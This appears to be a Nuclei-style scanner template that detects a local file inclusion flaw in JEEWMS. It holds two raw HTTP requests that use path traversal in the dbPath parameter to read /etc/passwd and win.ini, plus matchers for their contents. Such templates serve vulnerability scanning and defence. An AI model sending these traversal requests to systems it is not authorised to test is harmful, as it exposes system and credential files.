http:
- matchers:
  - condition: or
    part: body
    regex:
    - 'root:.*:0:0:'
    - \[(font|extension|file)s\]
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
  - 'GET /systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
id: jeewms-lfi
info:
  author: pikpikcu
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: JEEWMS is vulnerable to local file inclusion.
  metadata:
    max-request: 2
  name: JEEWMS - Local File Inclusion
  reference:
  - https://mp.weixin.qq.com/s/ylOuWc8elD2EtM-1LiJp9g
  severity: high
  tags: jeewms,lfi,vuln
